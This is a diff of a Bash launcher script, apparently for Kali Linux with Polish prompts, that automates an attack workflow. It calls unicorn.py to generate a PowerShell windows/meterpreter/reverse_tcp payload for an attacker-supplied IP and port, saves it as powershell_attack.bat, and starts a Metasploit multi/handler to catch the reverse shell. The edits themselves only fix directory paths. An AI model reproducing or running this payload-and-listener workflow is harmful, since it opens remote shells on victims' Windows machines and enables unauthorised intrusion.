@@ -19,7 +19,7 @@ read -r -p "Input IP of payload - " IP
 read -r -p "Input port of payload - " PORT
 ./unicorn.py windows/meterpreter/reverse_tcp $IP $PORT
 mv /home/kali/Desktop/KOZ1OLMENU/unicorn/powershell_attack.txt /home/kali/Desktop/powershell_attack.bat
-cd /home/kali/Desktop/K0Z1OLMENU
+cd /home/kali/Desktop/KOZ1OLMENU
 while true
 do
  read -r -p "Do you want start metasploit ? (y/n) - " ODPOWIEDZ
@@ -29,7 +29,6 @@ do
   echo "Uruchamiam skrypt... "
   sleep 3
   sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
-  sudo ./K0Z1OLMENU.sh
  break
  ;;
      [nN][eE][sS]|[nN])
@@ -47,7 +46,7 @@ do
  case $ODPOWIEDZ2 in
      [yY][eE][sS]|[yY])
   echo "Uruchamiam skrypt... "
-  cd ..
+  cd /home/kali/Desktop/KOZ1OLMENU
   sudo ./K0Z1OLMENU.sh
  break
  ;;
